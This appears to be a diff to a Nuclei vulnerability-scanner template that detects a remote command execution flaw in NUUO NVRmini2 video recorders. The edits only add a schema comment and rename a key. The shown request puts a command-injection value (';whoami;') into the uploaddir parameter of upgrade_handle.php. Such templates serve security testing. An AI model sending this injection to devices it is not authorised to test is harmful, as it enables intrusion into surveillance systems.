@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: nuuo-nvrmini2-upgradehandlephp-rce
 
 info:
@@ -10,7 +11,7 @@ info:
     - https://github.com/berkdsnr/NUUO-NVRMINI-RCE
     - https://packetstormsecurity.com/files/151573/NUUO-NVRmini-upgrade_handle.php-Remote-Command-Execution.html
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;whoami;%27"
